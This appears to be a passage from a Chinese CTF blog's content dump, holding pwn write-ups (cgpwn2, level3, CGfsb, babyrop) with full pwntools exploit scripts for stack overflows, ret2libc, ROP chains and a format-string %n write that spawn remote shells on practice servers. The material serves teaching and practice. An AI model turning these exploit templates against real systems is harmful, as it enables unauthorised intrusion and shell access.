</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;passwd:\n&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> sh.recvall()</span><br></pre></td></tr></table></figure><h2 id="关于整数溢出"><a href="#关于整数溢出" class="headerlink" title="关于整数溢出"></a>关于整数溢出</h2><p>整数分为有符号和无符号两种类型，有符号数以最高位作为其符号位，即正整数 最高位为1，负数为0，无符号数取值范围为非负数</p><p>也就是说，对于一个2字节的unsigned short int 型变量，它的有效数据长度为2个字节，当它的数据长度超过2个字节时，就发生溢出，溢出的部分则直接忽略。使用相关变量时，使用的数据仅为最后2个字节，因此就会出现65537等于1的情况</p><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./cgpwn&#x27;</span>)</span><br><span class="line">sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="number">0x0804A080</span></span><br><span class="line">p1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">42</span> + p32(sys_addr) + p32(<span class="number">0xaaaa</span>) +p32(binsh_addr)</span><br><span class="line">p = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">49922</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;here&#x27;</span>,p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ol><li>‘a’*42：看栈可知s距离ebp有0x26，十进制即为38，再加上需要覆盖的ebp长度，由于是32位程序，所以ebp长度0x4，所以总共需要填充’a’*(38+4)</li><li>p32(sys_addr)：system函数的地址</li><li>p32(0xaaaa)：用于填充system函数的返回地址，由于system(“/bin/sh”)后直接拿到shell，所以随便填个返回地址就行</li><li>p32(binsh_addr)：name的地址，因为name的值就是’/bin/sh’，所以用它作为system的参数</li></ol><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><code>知识点</code></p><ul><li>ret2lib</li></ul><p>开了NX不可执行，无system，无binsh，明显为ret2libc</p><p>ret2lib是一种利用缓存区溢出的代码复用漏洞，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数。</p><p>lib内的地址是随机的，但是函数的相对地址是不变的，我们可以通过获取lib中和程序中的write函数地址来得知函数地址的偏移量，并利用lib中的system和binsh和偏移量求出真实的system和binsh函数地址，进而完成system（/bin/sh）<br>具体步骤：<br>（1）利用function（）函数中的read函数构造溢出，复写返回地址为plt中的write函数地址<br>（2）通过write函数泄露函数read在内存中的绝对地址，并且接着调用function（）函数<br>（3）计算system和binsh的绝对地址，构造system(“/bin/sh”)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#获取远程进程对象</span></span><br><span class="line">p=remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">41496</span>)</span><br><span class="line"><span class="comment">#获取本地进程对象</span></span><br><span class="line"><span class="comment">#p = process(&quot;./level3/level3&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取文件对象</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3/level3&#x27;</span>)</span><br><span class="line"><span class="comment">#获取lib库对象</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./level3/libc_32.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#获取函数</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment">#接收数据</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line"><span class="comment">#char[88] ebp  write函数地址  write函数返回地址(返回到main函数)  write函数参数一(1)  write函数参数二(write_got地址)  write函数参数三(写4字节)</span></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#获取write在got中的地址</span></span><br><span class="line">write_got_addr=u32(p.recv())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_got_addr)</span><br><span class="line"><span class="comment">#计算lib库加载基址</span></span><br><span class="line">libc_base=write_got_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="comment">#计算system的地址</span></span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#计算字符串 /bin/sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep &quot;/bin/sh&quot; 获取</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x15902b</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(bin_sh_addr)</span><br><span class="line"><span class="comment">#char[88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)</span></span><br><span class="line">payload2=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)+p32(<span class="number">0x11111111</span>)+p32(bin_sh_addr)</span><br><span class="line"><span class="comment">#接收数据</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line"><span class="comment">#发送payload</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#切换交互模式</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">52400</span>)</span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;read&#x27;</span>])+p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="comment"># /bin/sh - read</span></span><br><span class="line">bin_cha = <span class="built_in">int</span>(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">bin_addr = read_addr + bin_cha</span><br><span class="line"></span><br><span class="line">sys_cha = <span class="built_in">int</span>(lib.symbols[<span class="string">&#x27;system&#x27;</span>]-lib.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">sys_addr = read_addr + sys_cha</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload1 = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span>+p32(sys_addr)+p32(<span class="number">1</span>)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p><code>知识点</code></p><ul><li>格式化字符串漏洞 printf(&amp;s)</li></ul><p>开了canary和nx，即没法直接覆盖返回地址和使用shellcode</p><p>如果写成printf(a)，就会出现格式化字符串漏洞，如果a是”%x”,那么printf就会输出它后面内存中的数据。</p><p>61即 ‘a’ 的ASCII码，61616161即为 ‘aaaa’，可以看到输入的 ‘aaaa’偏移了10位，如果你不确定自己数的对不对，可以验证一下，用 ‘%10$x’，这个可以直接查看第十位的数据</p><p>这里说下可以直接读取第七个参数的方法。（在linux下有用，win下没用）<br>%&lt; number&gt;$x 是直接读取第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.</p><p>格式化字符串中，有一个%n比较特殊，**%n可以将它前面已打印的字符个数赋值给后面它对应的参数**，例子</p><blockquote><p>来自于<a href="https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c">stack overflow</a><br>#include &lt;stdio.h&gt;<br>int main(){<br>int val;<br>printf(“blah %n blah\n”, &amp;val);<br>printf(“val = %d\n”, val);<br>return 0;<br>}<br>output:<br>blah blah<br>val = 5</p></blockquote><p>%n前的字符个数为5，所以将5赋值给了val。但是好像Windows上不让用%n赋值….所以别再Windows下试了</p><p>思路：</p><ol><li>第一次运行程序，name随便输，在输入message时利用%x计算输入位置偏移</li><li>第二次运行程序，name随便输，在输入message时，先输入pwnme的地址</li><li>利用 <em>%偏移$n</em> 改变pwnme的值为8</li><li>拿到flag</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x0804A068</span>) + <span class="string">&#x27;aaaa%10$n&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">56666</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tell me your name:&#x27;</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your message please:&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>payload解释：</p><ol><li>p32(0x0804A068)：pwnme的地址，双击pwnme即可查看</li><li>‘aaaa%10$n’：p32打包后的数据是4位的，但是要赋值8给pwnme，所以再填充4个a，然后把8赋值给第十个参数，即pwnme的地址对应的值</li></ol><h2 id="做题技巧？"><a href="#做题技巧？" class="headerlink" title="做题技巧？"></a>做题技巧？</h2><p>x64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">main_addr = <span class="number">0x400B28</span> <span class="comment"># main开始地址</span></span><br><span class="line">pop_rdi = <span class="number">0x400C83</span></span><br><span class="line"><span class="comment"># got表泄露</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 程序中有的函数</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;1&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure><p>x86</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment"># 为什么还是puts</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">22</span>+p32(write_plt) + main + <span class="number">1</span> + read_got + <span class="number">4</span> <span class="comment">#  泄露 read函数</span></span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">22</span> +p32(system) + p32(main) + binsh_addr </span><br></pre></td></tr></table></figure><h3 id="x64ROP"><a href="#x64ROP" class="headerlink" title="x64ROP"></a>x64ROP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25591</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line">sys_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi =  <span class="number">0x400683</span></span><br><span class="line">p1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.sendline(p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>get一个函数用来获取真实地址</p><p>bjdctf_2020_babyrop</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28426</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./bjdctf_2020_babyrop&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400733</span> <span class="comment">#找 pop r15  截取中间 会被认为是pop rdi</span></span><br><span class="line"><span class="comment"># ROPgadget --binary bjdctf_2020_babyrop |grep &quot;pop rdi&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) <span class="comment"># 得到真实地址 (p.recv()[:4])</span></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="x86-ROP"><a href="#x86-ROP" class="headerlink" title="x86 ROP"></a>x86 ROP</h3><p>babyrop 9 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29889</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn7&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x7</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露read的got地址</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">0x8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)*<span class="number">2</span>+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2020 青龙组]jocker</title>
      <link href="/2021/09/08/Re/reverse_CTF/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker/"/>
      <url>/2021/09/08/Re/reverse_CTF/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker/</url>
      
        <content type="html"><![CDATA[<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> Buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯_2020_青龙组]singal</title>
      <link href="/2021/09/08/Re/reverse_CTF/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/"/>
      <url>/2021/09/08/Re/reverse_CTF/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/</url>
      
        <content type="html"><![CDATA[<h1 id="vm逆向与符号执行angr"><a href="#vm逆向与符号执行angr" class="headerlink" title="vm逆向与符号执行angr"></a>vm逆向与符号执行angr</h1><p>经典无壳，IDAF5直接逆向，改几个名字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 